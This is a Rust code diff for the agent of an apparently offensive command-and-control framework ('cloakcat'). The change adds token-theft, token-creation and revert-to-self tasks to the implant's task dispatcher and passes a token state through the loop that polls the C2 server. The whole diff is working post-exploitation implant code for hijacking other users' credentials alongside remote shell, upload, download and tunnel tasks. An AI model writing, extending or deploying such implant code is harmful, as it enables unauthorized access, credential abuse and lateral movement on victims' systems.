@@ -12,8 +12,8 @@ use std::time::Duration;
 
 use anyhow::Context;
 use cloakcat_protocol::{
-    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, PollResponse,
-    ResultReq, TaskType, TunnelAction, UploadTask,
+    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, MakeTokenTask,
+    PollResponse, ResultReq, StealTokenTask, TaskType, TunnelAction, UploadTask,
 };
 use rand::Rng;
 use tokio::time::sleep;
@@ -68,6 +68,7 @@ async fn dispatch_task<T: Transport>(
     agent_id: &str,
     auth_token: &str,
     cmd: &Command,
+    token_state: &mut tasks::token::TokenState,
 ) -> anyhow::Result<(i32, String, String)> {
     match cmd.task_type {
         TaskType::Shell => run_command(cmd).await,
@@ -90,6 +91,17 @@ async fn dispatch_task<T: Transport>(
             )
             .await
         }
+        TaskType::StealToken => {
+            let task: StealTokenTask = serde_json::from_str(&cmd.command)
+                .context("bad StealTokenTask payload")?;
+            tasks::token::steal_token(token_state, task.pid)
+        }
+        TaskType::MakeToken => {
+            let task: MakeTokenTask = serde_json::from_str(&cmd.command)
+                .context("bad MakeTokenTask payload")?;
+            tasks::token::make_token(token_state, &task.domain_user, &task.password)
+        }
+        TaskType::Rev2Self => tasks::token::rev2self(token_state),
     }
 }
 
@@ -168,6 +180,7 @@ pub async fn run() -> anyhow::Result<()> {
         .and_then(|v| v.parse().ok())
         .unwrap_or(60_000);
     let mut backoff_ms: Option<u64> = None;
+    let mut token_state = tasks::token::TokenState::new();
 
     loop {
         let url = format!("{}?hold=45", endpoints.poll);
@@ -243,7 +256,7 @@ pub async fn run() -> anyhow::Result<()> {
         };
         debug_log!("[agent] poll: got cmd id={} type={:?}", cmd.cmd_id, cmd.task_type);
 
-        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd).await {
+        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state).await {
             Ok(triple) => triple,
             Err(e) => {
                 debug_log!("[agent] task error: {e} -> send minimal result");
